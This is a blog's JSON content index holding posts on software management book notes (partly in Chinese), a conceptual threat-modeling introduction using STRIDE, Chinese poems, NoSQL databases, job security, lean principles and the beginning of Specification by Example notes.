Objectives）；褒奖出色完成任务的某些员工；奖励、奖金、红利与绩效挂钩；用各种可能的形式测量绩效。\nBinwei: 这个稍微有点理想化，如果不去考核绩效，那又该如何管理？仅供参考罢了\n领导方式 最好的经理的标志是具备这样的能力：能够挑出少数能把前瞻性和成熟恰当混合在一起的关键人才，并使之不受约束。\n好的经理会为团队提供频繁而又容易一起实现成功的机会。这些机会可以是很小的、起前导作用的子项目或示范、暗示等，可以是使团队快速养成一起去获得成功的习惯的任何东西。 最好的成功是没有明显管理的成功，在这样的成功中，团队工作起来如同一个亲切的同事集体。最好的老板是能一遍又一遍地管理这个集体，而又不让团队成员知道他们已经“被管理了”。\n对团队的尊重总是好经理的特征。 在有最好亲和力的公司中，经理将他们的精力花在建设和维持健康的亲和力上。 亲和力建设策略的要素：质量崇拜；提供许多令人满意的完形；建立精英意识；允许和鼓励异端；保持和保护成功的团队；提供战略但不是战术指导。 在头脑风暴上，不鼓励诸如“那是不明智的主意”之类的消极评论，因为愚蠢的主意经常会引领其他人思考聪明的主意。\n平庸的经理老是提心吊胆，害怕放手就会失控，而伟大的经理知道本质上人是不可管理的；成功管理的本质是使每一个人朝着同一个方向努力，然后使他们热情高涨，高涨到任何事物即使是他们的经理也不能阻止他们前进步伐的程度。 他们已经进步到了这样的程度：在公司的最好利益方面，他们自己的指示比任何自上而下的指示都更正确。这时，就不要挡他们的道了。\n让正确的人去做正确的事。这就是优秀的管理者和平庸的管理者之间的区别。\nBinwei: 在大企业中，公司的条条框框会特别多。让最顶尖的人才不受这些约束，是需要智慧和勇气的。也需要最高领导层的支持，否则会把自己搞成攻击对象。\n用心管理 管理并不完全是一门动脑子的科学\n管理者要学会相信自己的内脏，用心来领导下属，并且构筑起团队和组织的灵魂。 人们会回应你的心。他们不会因为你聪明或者因为你一贯正确而追随你，他们只会因为爱你而追随你。 我知道这听起来有点太理想化了，但这是事实。我回想那些我尊敬的管理者，他们都有着广阔的胸襟。 在某种意义上，心是管理的根本要素。会动脑的‘领袖’可以带领别人，但是别人不会追随他。 你在团队中培育的灵魂就好像贝壳里的一粒沙。它是一颗种子，围绕着它，团体才能开始形成。\n你喜欢、尊重为你工作的人．你关心他们．他们的问题就是你的问题，他们的担忧就是你的担忧。你的胸怀像天空一样宽广。在一个人真正证明自己的可信以前，你就信任他。你让我们都觉得你把我们当成一家人，这就是我们跟着你的原因\n如果你不喜欢一个人，就没法说服他. 如果你不关心别人，不照顾别人，就别想让他们为你做一些不同寻常的事情。如果要让他们改变，就必须去了解（并赞赏）他们的过去。\nBinwei: 经济基础决定上层建筑，如果无法解决经济基础问题，比如工资待遇，职业发展机会等等，上层建筑问题就无从谈起。\n鼓励变化 在所有成功的工程中(以及在绝大多数其他有价值的工作中)，变化都是基本的要素之一。\n不变只是愿望，变化才是永恒 --斯威夫特\n企业应该鼓励产生变化的活动，并且创建相应的环境。 除非感到安全，否则人们就不能去迎接变化；安全感的缺乏会让人们反对变化。 培养一种不允许出错的气氛只会让人们产生防备心理。\n普遍的做法是，选择一种方法，试试看；如果失败了，没关系，再试试别的。不管怎么样，重要的是先去尝试。 --富兰克林。罗斯福\n随着公司的“成熟”，它们越来越不愿意冒险。 最值得做的项目是在开发时能让你们公司的“过程成熟度”下降整整一个等级的项目。\nBinwei: 重要的一点是不能走极端。需要让变化的结果可以被衡量，并且去衡量之。 不能因为变化没有产生期望效果而去惩罚员工，同时也不要走向另外一个极端，盲目地接受执行所有的变化。 否则，一个企业中有太多的“聪明人”，整天劳命伤财地整各种创新，并不用为之担任何责任，这样的企业也会马上失去竞争力的。\n社会学问题 本质上，我们工作中的主要问题，与其说是技术问题（technological），不如说是社会学问题（sociological）。 世界上根本没有什么工作是与政治无关的。\n我们倾向于集中精力做技术方面，而不是人际关系方面工作的主要原因，不是因为它更重要，而是因为它更容易做。\n人员流动率 人员流动率成本占所有人力资源开支的50%。但是那只是看得见的成本。有一笔可怕的、看不见的、更加糟糕的成本。 在流动率很高的公司，人们倾向于持毁灭性的短期观点，因为他们知道自己不打算长期呆在那里。\n在短期时间内解雇需要再培训的人，而雇佣已经有经验的人总是更便宜。再培训有助于建立因低流动率和强有力的社区意识产生的恒心。\nBinwei: 再培训得看人，如果不是对的人，替换的成本会小得多\n病态的政治 “病态的政治”可能在任何地方出现，哪怕是在最健康的组织里面。 “病态的政治”的特征：对个人权势的渴望超过了组织本身的目标。\n每一天，你都必须准备拿自己的工作打赌\n不要浪费时间，也不要因为尝试治疗上司的病态而使自己受到威胁。 有时候，你唯一的选择就是等待，等问题自己解决，或者等一个让你继续前进的机会。奇迹时有可能发生的（但是千万别去指望它）。\n冲突 只要在开式过程中有多个参与者，就一定会有冲突存在。 绝大多数系统开发团队都缺乏解决冲突的能力。 冲突应当引起重视。冲突并不是缺乏职业道德的行为。 应当提前声明：所有人的‘赢’都是受重视的。确保每个级别的人都能赢。 记住：我们都站在同一边；跟我们对立的，是我们要解决的问题。\n如果两个人的利益是完全或者部分相斥的，预先做好安排，准备好请双方通过调解来解决冲突。\n谈判困难；调解容易。调解人所处的位置应该是没有权力的\n催化剂的角色： 有这样一种催化剂式的人物，这样的人能帮助团队成型并凝聚，保持团队的健康和生产力，从而对项目做出贡献。就算“催化剂”别的什么事情都不干（其实，通常他们还会干很多别的事），这种催化剂的角色也是重要而有价值的。 调解是“催化剂”的一项特殊工作。调解是可以学的，而且只需要很小的投资就能学会。 调解应该从一个小小的仪式开始。“我能帮你们调解一下吗？”在解决冲突的时候，这是必要的第一个步骤。\n威胁和愤怒 威胁不是提高业绩最好的方法。 如果分配的时间一开始就不够，不管威胁有多么吓人，工作也无法按时完成。 更糟糕的是，如果目标没有实现，你就必须兑现你的威胁\n人们可能会因为来自客观世界的直接的恐吓而觉得没有安全感，但是如果察觉到管理者可能滥用权力来惩罚自己，他们也会觉得没有安全感。\n管理中的愤怒和耻辱是会传染的。如果高级管理者喜欢骂人，低级管理者也会有样学样（就像经常被骂得小孩很容易变成爱骂人的父母）。 管理中的辱骂常被认为是一种刺激，可以让员工提高效率。在“胡萝卜加大棒”的管理策略中，辱骂是最常见的“大棒”。但是，哪有人被辱骂之后还能做得更好的? 如果经理使用辱骂得方法来刺激员工，这就表现出经理的无能，而不是员工的无能。 不要在冲突的时候才去调解，这就是关键。我们需要在冲突完全形成之前就去调解，这正是‘全赢’的根本。 愤怒就是害怕。在工作中．恐惧是不可容忍的情绪，你绝对不会允许自己害怕。但是，你总会表现出些什么。你总得另外选择一种情绪，不然你会爆炸的。由于某些原因．愤怒是可以接受的情绪，所以人们总是选择发怒，于是愤怒就成了恐惧的代名词。当然，如果是对家人、对朋友发怒，那又是另一回事，但是在工作中，愤怒都是因为恐惧。\n直达天庭的坏消息 在绝大多数组织中缺少的正是一条干净的、隐蔽的、可以向老板传递真正的信息的途径。所以，每个人都想说、每个好老板都想听的那些坏消息却总是要到迟得不能再迟的时候才能到达老板那里。 建立简单的(可能是匿名的)通道，让坏消息能传递到高层。\nBinwei: 这个需要掌握好尺度，做到好的可以参见雍正，做的不好的可以参见武则天\n项目管理实践 项目团队 任务可以成功地转移，但是对于项目的转移，即使有良好的文档、先进的设计以及保留部分原有人员，新队伍实际上依然是重新开始。我认为正式由于破坏了原有团队的整体性，导致了产品雏形的夭折，项目重新开始。 创造力来自于个人，而不是组织架构或者开发过程，项目经理面临的中心问题就是如何设计架构和流程，来提高而不是压制主动性和创造力。\n精简沟通 树状组织架构是作为权利和责任的结构出现。其基本原理--管理角色的非重复性--导致了管理结构是树状的。但是交流的结构并非限制得如此严格，树状结构几乎不能用来描述交流沟通，因为交流是通过网状结构进行的。\n在堆积如山的文件资料中，少数文档是关键枢纽，每一件项目管理的工作都围绕着它们运转。这些文档是项目经理最重要的个人工具。 现实中，流程图被鼓吹的程度远大于它们的实际作用。\n不论别人是否明白我们的意思，描述都应该简短精炼。 -- 塞缪尔。巴特勒\n让不必与会的人可以放心离开，从而保证会议的精简。有一份公开的议程，并严格执行，这是最简单的办法。\nBinwei: 精简的沟通非常难，需要每个参与的人真正理解问题，做好准备\n风险 浪费和风险总是紧紧绑在一起的。 如果我只能做一件事，那就是控制住风险。我会通过控制项目面临的风险来管理每个项目。软件开发是有风险的业务，管理这项业务，说到底就是要控制风险。 在风险真正变成一个问题之前，总会有一些早期的迹象，所以你需要先断定这些早期迹象是什么，然后像鹰那样去寻找它们。\n风险控制：\n通过控制风险来管理项目。 为每个项目创建并维护风险统计表。 跟踪根源性的风险，而不只是最后那讨厌的结果。 评估每种风险具体化的概率和可能造成的开销。 对于每种风险，预测标志其具体化的早期征兆。 任命一个风险控制官，这个人不应该维护组织内部“我能行”的态度。 逃避风险是致命的，因为这会让你也得不到与风险同在的利益\n项目管理 两个人的团队，其中一个是领导者，常常是最佳的人员使用方法（留意一下上帝对婚姻的设计） 项目经理的基本职责是使每个人都想着相同的方向前进。 项目经理的主要日常工作是沟通，而不是做出决定；文档使各项计划和决策在整个团队范围内得到交流。\n项目需要仪式。用小小的仪式来使人们注意项目的目标和理想状态：小规模会议、零缺陷工作等等。\n企业目标总是在被员工们认真考虑和审查的，而审查的结果是，大多数目标被认为是非常武断的。 一个渴求达到目标的经理会说：不是团队达到目标，事情都是“人”而不是“团队”干的。 一个团队的目的不是达到目标而是向目标看齐。\nBinwei: 难道领导不懂行是普通现象？\n关于质量 任何人若想看到一件完美无瑕的作品，他所想的那种作品过去不存在，现在尚未出现，将来也不会出现 --亚历山大。波普\n质量是免费的，但只是对那些愿意为此付出巨大代价的人而言。\n检查是避免错误最简便的方法。 如果你不通过检查避免错误，那就只能通过测试来找到它们，这样会浪费更多的时间。\nBinwei: 检查测试来验证质量，如果没法通过某些方法来验证，那么就不要去假设质量已经达到\n人员超编 在早期，人员超编会迫使项目跨过关键的设计阶段（这是为了让所有的人有事可做）。 如果在设计完成之前，工作先被分给了很多人，那么人与人之间、工作组之间的接口就会很乱套。 这会使团队内部耦合度提高，会议时间、重复劳动和无效工作都会增加。 理想的人员安排是这样：在项目的的大部分时间里由小型核心团队来做设计工作，在开发的最后阶段（时间安排的最后1/6）加入大量的人手。\n概念的完整性要求设计必需由一个人，或者非常少数互有默契的人员来实现。 其实，对于在整个设计中，保证这些看似琐碎的问题处理原则上的一致性，决不是一件无关紧要的事情。 在毫无限制的实现小组中，在进行结构上的决策时，会出现大量的想法和争议，对具体实现的关注反而会比较少。\n对于人员超编的项目，标准过程看上去会很严谨，因为它们制造出了足够的工作（有用的和无用的），让所有人都忙碌不停。\nBinwei: 说的太对了，可笑的是这样子的事情一而再再二三地在企业中发生。\n设计与架构 如果不大幅度减少调试的时间，就没办法让项目大幅度提前完成 高速完成的项目用在调试上的时间也成比例地少得多 高速完成的项目用在设计上的时间也成比例地多得多\n要想成功，结构师必须：\n牢记是开发人员承担创造性和发明性的实现责任，所以结构师只能建议，而不是支配； 时刻准备着为所指定的说明建议一种实现的方法，同样准备接受其他任何能达到目标的方法； 对上述的建议保持低调和不公开； 准备放弃坚持所作的改进建议。 概念完整性是系统设计中最重要的考虑因素。 功能与理解上的复杂程度的比值才是系统设计的最终测试标准，而不仅仅是丰富的功能。\n必须拥有完整的测试用例，在添加了每一个新构件之后，都要用它们来测试子系统。因为那些原来可以在子系统上成功运行的用例必须在现有系统上重新运行，对系统进行回归测试。\nBinwei: 架构师需要对总体有把控，但是需要充分调动整个团队的积极性。\n常识 项目既需要目标，也需要计划。而且这两者应该不同。\n人们通常期望项目在接近结束时，软件项目能收敛得快一些，然而，情况却是越接近完成，收敛得越慢。\n小型的团队可以在很短的时间内创造奇迹，而大型团队极少能做到同样的事情。\n合并文件：即把文档整合到源程序。这对正确维护是直接有力的推动，保证编程用户能方便、及时地得到文档资料。\n在很多领域中，那些有根本性突破的研究人员是在做高科技业务，我们所有其他局外人只是他们工作成果的应用者。\nBinwei: 这种高科技幻觉需要警惕，这个和企业以及个人的竞争力息息相关。对自己有错误的定位会是危险的。\nWritten by Binwei@Oslo\n","link":"http://localhost:1313/post/2017/the_mythical_deadline_of_peopleware_man_month/","section":"post","tags":["booknotes","chinese"],"title":"The Mythical Deadline of Peopleware Man-month"},{"body":"Threat Modeling: Introduction Published: May 07, 2017 Tags: security Category: ComputerScience\nWith more and more data and software go to internet, the security becomes crucial for software development. OWASP (Open Web Application Security Project) lists top 10 security risks:\nInjection Broken Authentication and session management Cross-site scripting Insecure Direct Object Reference Security Misconfiguration Sensitive data exposure Missing function level access control Cross site request forging Components with known vulnerabilities Invalidated requests and forwards Security risks are everywhere and it is difficult to make secure software.\nThreat modeling is a systematic way to ensure that your software is designed for security. This blog explains briefly what is threat modeling.\nTable of Contents Thrust boundaries Identify thrust boundaries is the first step, which is equivalent to attack surface. There are several ways to identify thrust boundaries by:\nAccounts Network interfaces Different physical computers Virtual machines Organizational boundaries Almost everywhere you can argue for different privilege STRIDE ‘STRIDE’ is mnemonic way to describe threat types.\nSpoofing: Pretending to be something or someone you’re not\nTampering: Modifying something you’re not supposed to modify. It can include packets on the wire (or wireless network), bits on disks or bits in memory.\nRepudiation: Means claiming you didn’t do something (regardless of whether you did or not)\nInformation disclosure: Exposing information to people who are not authorized to see it.\nDenial of service: Attacks designed to prevent a system from providing service, including by crashing it, making it unusually slow, or filling all its storage.\nElevation of privilege: A program or user is technically able to do things that they are not supposed to do.\nActions strategy For each threat, you can have different action strategy accordingly.\nMitigate threats: Doing things to make it harder to take advantage of a threat.\nEliminate threats: It is almost always achieved by eliminating features.\nTransferring threats: It is about letting someone or something else handle the risk.\nAccepting the risk: It is the final approach to addressing threats.\nAuthentication: Mitigating Spoofing In general, only programs running at the same or lower level of trust are spoofable, and you should endeavor to trust only code running at a higher level of trust, such as in the OS.\nTactics for authentication Without crypto: for example, verify IP or DNS entry which is unreliable\nUsing crypto: That validation cannot be delegated entirely to machines. You can choose to delegate it to one or the many companies that assert they validate these things. For example: PKI (public key infrastructure); CA (certification authorities)\nPKI is a cryptographic technique that enables entities to securely communicate on an insecure public network, and reliably verify the identity of an entity via digital signatures.\nA PKI is an arrangement that binds public keys with respective identities of entities (like people and organizations). The binding is established through a process of registration and issuance of certificates at and by a certificate authority (CA).\nAuthentication technologies For computer (or accounts): IPSec, DNSSEC, SSH host keys, Kerberos authentication, HTTP Digest or Basic authentication, Windows authentication (NTLM), PKI system, such as SSL or TLS with certificates\nFor bits (files, messages, etc): Digital signatures, hashes\nFor people:\nSomething you know, e.g. password;\nSomething you have, e.g. access card;\nSomething you are, e.g. biometrics, photo graphs;\nSomething you know who can authenticate you\nFor maintaining authentication across connection, e.g. Cookies\nDeveloper ways to address spoofing: Within an operating system, you should aim to use full and canonical path names for libraries, pipes, and so on to help mitigate spoofing.\nIntegrity: Mitigating Tampering Tactics Relying on system defense such as permission Use cryptographic mechanisms Use of logging technology and audit activities as a deterrent If you are implementing a permission system, you should ensure that there’s a single permission kernel also called a reference monitor.\nThe most important element of assuring integrity is about process, not technology.\nTechnology For protecting files: ACL or permission, Digital signature, Hashes, Window Mandatory Integrity Control (MIC) feature, Unix immutable bits\nFor protecting network traffic: SSL, SSH, IPSec, Digital signature\nNon-Repudiation: Mitigating Repudiation Repudiation is a somewhat different threat because it bridges the business realm, in which there are four elements to addressing:\nPreventing fraudulent transactions Taking note of contested issues Investigating them Responding to them Non-Repudiation Technologies Logging, log analysis tools, Secured log storage, Digital signature, Secure time stamps, Trusted third parties, Hash trees, tools for preventing fraud\nConfidentiality: Mitigating Information Disclosure Information disclosure can happen at rest (in storage) or in motion (over a network)\nTactics Within the confines of a system, you can use ACL Outside the confines, you must use cryptography Technologies Protecting files: ACL/Permissions, Encryption, Appropriate key management\nProtecting network data: Encryption, Appropriate key management\nProtecting communication headers or the fact of communication: Mix network, Onion routing, Stenography\nAvailability: Mitigating Denial of Service Technologies ACL, Filters, Quotas (rate limiting, thresholding, throttling), High-availability design, Extra bandwidth (rate limiting, throttling), Cloud services\nAuthorization: Mitigating Elevation of Privilege Technologies ACL, Group or role membership, Role based access control, Claims-based access control, Windows privileges, Unix sudo, Chroot, AppArmor or other unix sandboxes, The ‘MOICE” Windows Sandbox pattern, Input validation for a defined purpose\nPrivacy Besides the security threats, we also have privacy threat.\nThere are several ways to address privacy threats:\nAvoid collecting information (minimization) Use crypto in various clever way, and control how data is used (compliance on regulation and policy) Written by Binwei@Oslo\n","link":"http://localhost:1313/post/2017/threat_modeling_introduction/","section":"post","tags":["security"],"title":"Threat Modeling: Introduction"},{"body":"Book notes: Bian Zhi Lin Anthology Published: May 02, 2017 Tags: booknotes, chinese Category: Literature\nBian Zhi Lin is modern poet, and is also alumnus of my high school (PuDong High School, Graduated in 1929). His poems are graceful, the most famous one is 'The Fragment' (DuanZhang).\n断章 你站在桥上看风景，\n看风景的人在楼上看你。\n明月装饰了你的窗子，\n你装饰了别人的梦。\n投 独自在山坡上，\n小孩儿，我见你\n一边走一边唱，\n都厌了，随地\n捡一块小石头\n向山谷一投。\n说不定有人，\n小孩儿，曾把你\n（也不爱也不憎）\n好玩地捡起，\n像一块小石头\n向尘世一投。\n雨同我 “天天下雨，自从你走了。”\n“自从你来了，天天下雨。”\n两地友人雨，我乐意负责。\n第三处没消息，寄一把伞去？\n我的忧愁随草绿天涯：\n鸟安于巢吗？人安于客枕？\n想在天井里盛一只玻璃杯，\n明朝看天下雨今夜落几寸。\n无题一 三日前山中的一道小水，\n掠过你一丝笑影而去的，\n今朝你重见了，揉揉眼睛看\n屋前屋后好一片春潮。\n百转千回都不跟你讲，\n水有愁，水自哀，水愿意载你\n你的船呢？船呢？下楼去！\n南村外一夜里开齐了杏花。\n","link":"http://localhost:1313/post/2017/book-bian_zhi_lin_shi_xuan/","section":"post","tags":["booknotes","chinese"],"title":"Bian Zhi Lin Anthology"},{"body":"","link":"http://localhost:1313/categories/literature/","section":"categories","tags":null,"title":"Literature"},{"body":"","link":"http://localhost:1313/tags/database/","section":"tags","tags":null,"title":"Database"},{"body":"","link":"http://localhost:1313/tags/nosql/","section":"tags","tags":null,"title":"Nosql"},{"body":"NoSQL: Introduction Published: May 1, 2017 Tags: database, nosql Category: ComputerScience\nNoSQL originally refers to \u0026quot;non SQL\u0026quot;, \u0026quot;non relational\u0026quot;, or \u0026quot;not only SQL\u0026quot;. NoSQL databases are increasingly used in big data and real-time web applications. NoSQL databases are not replacing relational database, there are scenarios only fit for NoSQL database. This blog give a brief introduction of NoSQL databases.\nTable of Contents Motivation The benefits you can get from NoSQL include:\nSimplicity of design In relational database, the application developers need to design the database scheme to store the data. There is difference between the schema and the in-memory data structure. Then the developers need to handle this 'gap'. This effort is not delivering business value.\nRelational database world invents ORM (Object-Relational-Mapping) to mitigate this challenge.\nHorizontal scaling Horizontal scaling means that you scale by adding more machines into your pool of resources whereas Vertical scaling means that you scale by adding more power (CPU, RAM) to an existing machine.\nNoSQL databases have better support for simpler \u0026quot;horizontal\u0026quot; scaling to clusters of machines (which is a problem for relational databases)\nA cluster of small machines can use commodity hardware and ends up being cheaper at these kinds of scale.\nFiner control over availability There is a common need to ensure the service availability. When one node is down, the backup should take effect.\nIt requires replication mechanism, which means to take the same data and copy it over multiple nodes\nThere are two kinds of replication methods:\nMaster-slave replication: Is a one-way replication (from master to slave), only the master database is used for the write operations, while read operations may be spread on multiple slave databases. It reduces the chances of update conflict.\nPeer-to-peer replication: It is bi-directional replication, each database (nodes) is publisher and subscriber. If any node goes down, the application will still be functional. Later, once the node is up it can be again brought in sync. This way we can achieve both high availability and fault tolerance. It can avoid loading all writes onto a single point of failure.\nSharding is also important, which is to put different data on different nodes.\nCategory In general, there are 4 categories NoSQL databases in NoSQL ecosystem:\nKey-value store Key-value store is the simplest NoSQL database. The basic data structure is a dictionary or map. Key-value databases are well-suited to applications that have frequent small reads and writes along with simple data models.\nAggregate is a collection of related objects that we wish to treat as a unit, which is indexed by a key that you can use of lookup. Aggregate is opaque to database which is just some big blob of mostly meaningless bits. Key-value store cannot run query not retrieve a part of the aggregate.\nExamples: Riak, Redis, Memcached, Berkely DB, Hamster DB, Amazon's Dynamo, Project Voldemort\nDocument database Document databases extend the concept of the key-value database. Document databases maintain sets of key-value pairs within a document. So document database is able to see a structure in the aggregate, which allows queries and partial retrievals.\nDocument database is flexible which does not require schema.\nExamples: MongoDB, Couch DB, Terrastore, OrientDB, RavenDB, Notes Storage Facility\nColumn-family Column-family databases are designed for large volumes of data, read and write performance, and high availability. If your data is small enough to run with a single server, then a column family database is probably more than you need - consider a document or key-value database instead.\nColumn-family databases store data in column families as rows that have many columns associated with a row key. Column-families are groups of related data that is often accessed together.\nColumn-family database has two-level aggregate structure, which allows you to store data with keys mapped to values and the values grouped into multiple column families, each column family being a map of data.\nEach column family can be compared to a container of rows in an RDBMS table where the key identifies the row and the row consists of multiple columns. The differences are:\nvarious rows do not have to have the same columns columns can be added to any row at any time without having to add it to other rows. Examples: Cassandra, Hbase, Hypertable, Amazon SimpleDB\nGraph database Graph databases allow you to store entities and relationships between these entities.\nIn graph databases, traversing the joins or relationships is very fast. The relationship between nodes is not calculated at query time but is actually persisted as a relationship. It means graph databases do not allow dangling relationship, and nodes can only be deleted if they don't have any relationships attached to them.\nExamples: Neo4j, OrientDB, Infinite Graph\nTechnical concepts There are several technical concepts relevant to NoSQL databases.\nMap-reduce pattern Map is a function whose input is a single aggregate and whose output is a bunch of key-value pairs.\nReduce takes multiple map outputs with the same key and combines their values.\nWhile the map function is limited to working only on data from a single aggregate, the reduce function can use all values emitted for a single key.\nEventual consistency Many NoSQL stores compromise consistency in favor of availability, partition tolerance, and speed.\nInstead, most NoSQL databases offer a concept of \u0026quot;eventual consistency\u0026quot; in which database changes are propagated to all nodes \u0026quot;eventually\u0026quot; (typically within milliseconds) so queries for data might not return updated data immediately or might result in reading data that is not accurate, a problem known as stale reads.\nAdditionally, some NoSQL systems may exhibit lost writes and other forms of data loss.\nFortunately, some NoSQL systems provide concepts such as write-ahead logging to avoid data loss.\nFor distributed transaction processing across multiple databases, data consistency is an even bigger challenge that is difficult for both NoSQL and relational databases.\nReferences NoSQL Distilled, book by Pramod J. Sadalage and Martin Fowler\nThoughtworks NoSQL databases overview .\nWritten by Binwei@Oslo\n","link":"http://localhost:1313/post/2017/nosql_introduction/","section":"post","tags":["database","nosql"],"title":"NoSQL: Introduction"},{"body":"Job Security Published: Apr 29, 2017 Tags: career Category: Management\nIn your company, there is only one should care about your job security: that is yourself. Many people treat the company as their home, put all their energy and be 100% loyal to the company, but seldom to think about themselves. There is nothing wrong with the attitude only if you are aware of the job security. Marketing is up-and-down and most companies needs to be profitable to survive. They have to lay off people if necessary, these people can be you no matter you treat the company as home or not. It will put you into a very negative situation if you do not prepare well for your job security.\nTable of Contents Income Job security will ensure you have income to grantee your living standard, and have the freedom to do what you like.\nIncome security Job security is different from income security.\nIf your job is all your income, or you have big load but only depend on your current job to pay that, then you give the power to people in the company towards you. Think about having income besides your job salary, e.g. rent your spare rooms, have part-time job.\nTake income security into your career management.\nEmergency fund Financial worries make people harder to think about other things and you need to prepare for the unexpected events.\nSetup emergency fund, e.g. 6-8 months income.\nLive (well) beneath your means I like the quote from Richard Stallman:\nI've always lived cheaply. And I like that, because it means that money is not telling me what to do. I can do what I think is important for me to do. Avoid getting sucked into expensive lifestyle habits. Because if you do that, then people with the money will dictate what you do with your life. You won't be able to what's really important to you.\nKnow your salary context Different occupation has different salary trending when age increases. You need to be aware of it and plan accordingly.\nThere are several things impact salary, it is important you understand the 'context' of your salary especially when you want to do a job hopping.\nKnow the salary context, then you will know plan your skill set and plan where to go next.\nSkill set In order to get job security, the skills and knowledge are the key! For the technology skills/knowledge, you can look into my previous blog: technology_to_learn_next\nAt the meantime, soft skills are important to build, which will not be obsolete.\nCommunication Leadership Networking Branding Networking and branding are very important. A lot of the good job positions are by referral, search jobs is the last choice for you.\nPlease also be aware that one tricky thing about most soft skills is they are quite difficult to identify in an interview.\nI will write blogs to explain the soft skill later.\nCareer path when aged Different career path requires you prepare differently in order to get job security. Job security become more and more important when people get aged.\nThe technical path Threats\nIt's harder to do the long hours Slower salary increases Pressure from lower cost experts Advice\nLeverage experience to build strengths in the design and architecture Develop non-technical expertise Seek out companies have distinct technical career paths Domain knowledge can matter Build your brand The management path Maybe\nPotential higher salaries at many companies Less pressure to maintain technical edge Advices\nRequires a distinct skill set, e.g. people management skills, business knowledge, project management, finance, logistics Other path Product management Marketing Writing (documentation, books, articles, podcasts, webinars) Technical evangelist or support Teacher/trainer Executive/Entrepreneur Join the right companies Companies are different, join a company fits you will make your life easier. The followings are the pros/cons to join different companies according to their size.\nBig companies Process is everything Limited impact Working 9-5 Friends and mentors Politics Stability - security and income Opportunity - lateral and international moves The risk of mediocrity Mid-size companies Process is relative Moderate impact Working 9-5,6,7... Friends and mentors Politics Stability - security and income Opportunity - fewer opportunities for lateral and international moves Mediocrity is noticed Small companies Process is what? Large impact Working 9-a...am Friends and mentor - but watch the show Politics Stability - what is that again? Opportunity - move with the company Mediocrity is fired Consulting Put on your sales hat, and a few others Adapting to the client Double the politics On your own Stability through diversity Lifestyle options Entrepreneur You have to be crazy Know why you're doing it Skills, advisors and partners Written by Binwei@Oslo\n","link":"http://localhost:1313/post/2017/job_security/","section":"post","tags":["career"],"title":"Job Security"},{"body":"Lean: Principles Published: Apr 27, 2017 Tags: lean, process Category: Management\nThe core idea of Lean is to maximize customer value while minimizing waste. A lean organization understands customer value and focuses its key processes to continuously increase it.\nTo accomplish this, lean thinking changes the focus of management from optimizing separate technologies, assets, and vertical departments to optimizing the flow of products and services through entire value streams that flow horizontally across technologies, assets, and departments to customers.\nThere are 5 principles in Lean.\nTable of Contents Identify value Value adding activities: We need to maximize the investment on value-adding activities.\nNon-value adding activities: Some activities do not create value but is still necessary, e.g. admin meetings. We need to be careful about the time spent on these activities.\nWaste: Waste does not create value for a customer, e.g. Partially Done Work, Extra Processes, Extra Features, Task Switching, Waiting, Motion, Defects. Waste needs to be eliminated.\nMainly, the root cause of waste can be categorized into followings:\nLack of understanding customers Lack of standard procedure and system Lack of communication and control Lack of responsibility and competence Map the value stream Mapping your value stream is a good way to start discovering the waste in your software development process. Value stream is a series of activities that must be done in a certain order at the right time to deliver a service.\nYour Value stream map is a representation of the flow of materials from supplier to customer through your organization as well as the flow of information. This enables you to see at a glance where the delays are in your process, any restraints and excessive inventory.\nYour current state map is the first step in working towards your ideal state for your organization.\nValue streaming mapping will be explained in my later blog.\nCreate flow After the waste has been removed from the value stream, the next step is to be sure the remaining steps flow smoothly with no interruptions, delays, or bottlenecks.\nEstablish pull With improved flow, time to market (or time to customer) can be dramatically improved. This makes it much easier to deliver products as needed, as in “just in time” manufacturing or delivery. This means the customer can “pull” the product from you as needed.\nLet customers' needs pull the work rather than have a schedule push the work\nQuite often, production workers were blamed for not doing exactly what was scheduled, but that was hardly the problem. The problem was that when even the smallest glitch arose, the schedule became invalid, and from then on, following the schedule just made things worse. Just-in-time changed all of this by bringing the concept of pull scheduling to manufacturing. Pull systems use a mechanism called Kanban, which was originally patterned after restocking grocery store shelves\nSeak perfection Making lean thinking and process improvement part of your corporate culture. As gains continue to pile up, it is important to remember lean is not a static system and requires constant effort and vigilance to perfect.\nAt the same time, be careful that do not let perfection to be the enemy of good!\nWritten by Binwei@Oslo\n","link":"http://localhost:1313/post/2017/lean_principles/","section":"post","tags":["process","lean"],"title":"Lean: Principles"},{"body":"Specification by Example Published: Aug 25, 2017 Tags: booknotes, process Category: ComputerScience\nSpecification by Example is a set of process patterns that helps teams build the right software product. With Specification by Example, teams write just enough documentation to facilitate change effectively in short iterations (Scrum or XP) or in flow-based development (Kanban).\nTable of Contents Introduction “The hardest single part of building a software system is deciding precisely what to build.”\n-- The Mythical Man-Month\r“The formulation of a problem is often more essential than its solution.”\n-- Albert Einstein\rSpecification by Example is to address the above questions.\nBesides that, Specification by Example also ensure documentation agile teams need to build is:\nPrecise and objectively testable Easy to maintain Written just-in-time What is a specification A specification should be\nPrecise and testable A true specification, not a script About business functionality, not about software design Once the functionality is implemented, the specification that describes it will serve a different purpose. It will document what the system does and alert us about functional regression.\nTo be effective in these goals, a specification should be\nSelf explanatory Focused In domain language An example of a very good specification with examples is shown here. Free delivery\nFree delivery is offered to VIP customers once they purchase a certain number of books. Free delivery is not offered to regular customers or VIP customers buying anything else than books. Given that the minimum number of books to get free delivery is five, then we expect the following: Difference from user stories User stories generally have three parts: “As a __ I want __ in order to __ .” Alternative formats exist, but all have these three components.\nAs a process, Specification by Example works both for high-level and lower-level stories. Once we have a high-level example of how something would be useful, we can capture that as a high-level specification. Such high-level examples allow us to objectively measure whether we’ve delivered a feature.\nUser stories have to fit into the sprint. When there is a bunch of those that are done, they’re tested in isolation. The larger user story isn’t actually tested. When the user stories are small grained you can’t really tell from the backlog whether things are really done.\nDifference from scripts A specification does not say anything about application workflow or session constraints.\nA script explains how something can be tested. It describes business functionality through lower-level interactions with a system. A script requires the reader to work back from the actions and understand what’s really important and what exactly is being illustrated. Scripts also bake the test into workflow and session constraints, which might change in the future even when the underlying business rules don’t change.\nA specification explains what the system does. It focuses on the business functionality in the most direct way possible. Specifications are shorter because they describe the business concepts directly. That makes them easier to read and understand than scripts. Specifications are also a lot more stable than scripts, because they won’t be affected by changes in workflow and session constraints.\nWatch out for descriptions of flows (first do this, then do that, ...). Unless specifying a genuine process flow, this is often a sign that a business rule is illustrated using a script. Such scripts will cause a lot of long-term maintenance problems.\nThe specification should explain what should it do rather than how should it work.\nDifference from software design Ideally, a specification should not imply software design. It should explain the business functionality without prescribing how it’s going to be implemented in software.\nThis serves two purposes:\nIt allows developers to find the best possible solution now. It allows developers to improve the design in the future. Specifications that focus on business functionality, without describing the implementation, enable the implementation to change more easily. A specification that does not say anything about software design won’t need to change when the 